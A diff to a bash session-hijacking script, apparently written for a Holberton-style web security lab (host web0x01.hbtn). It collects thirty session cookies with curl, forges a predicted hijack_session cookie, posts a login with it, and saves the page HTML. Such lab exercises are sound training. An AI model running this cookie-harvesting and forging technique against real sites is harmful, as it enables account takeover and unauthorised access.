@@ -1,7 +1,8 @@
 #!/bin/bash
 
-# URL to fetch cookies from
-URL="http://web0x01.hbtn/a1/hijack_session/"
+# Base URL to fetch cookies from
+BASE_URL="http://web0x01.hbtn/a1/hijack_session/"
+LOGIN_URL="http://web0x01.hbtn/api/a1/hijack_session/login"
 
 # Number of requests to make
 REQUEST_COUNT=30
@@ -10,9 +11,9 @@ REQUEST_COUNT=30
 cookies=()
 
 # Fetch cookies
-echo "Fetching $REQUEST_COUNT cookies from $URL..."
+echo "Fetching $REQUEST_COUNT cookies from $BASE_URL..."
 for ((i = 1; i <= REQUEST_COUNT; i++)); do
-    cookie=$(curl -s -I "$URL" | awk '/hijack_session/ {print $2}')
+    cookie=$(curl -s -I "$BASE_URL" | awk '/hijack_session/ {print $2}')
     if [ -n "$cookie" ]; then
         cookies+=("$cookie")
     fi
@@ -57,8 +58,18 @@ echo "Generated cookie: $random_cookie"
 # Run the POST command
 echo -e "\n--- Executing POST Request ---"
 response=$(curl -X POST -b "hijack_session=$random_cookie" \
-    "$URL/login" \
+    "$LOGIN_URL" \
     -d '{"email": "pepe@pepe.com", "password": "halal"}')
 
 echo "Response from server:"
 echo "$response"
+
+# Fetch and display HTML content of the site
+echo -e "\n--- Fetching HTML Content of $BASE_URL ---"
+html_content=$(curl -s "$BASE_URL")
+echo "$html_content"
+
+# Save HTML content to a file for review
+output_file="site_content.html"
+echo "$html_content" > "$output_file"
+echo "HTML content saved to $output_file."
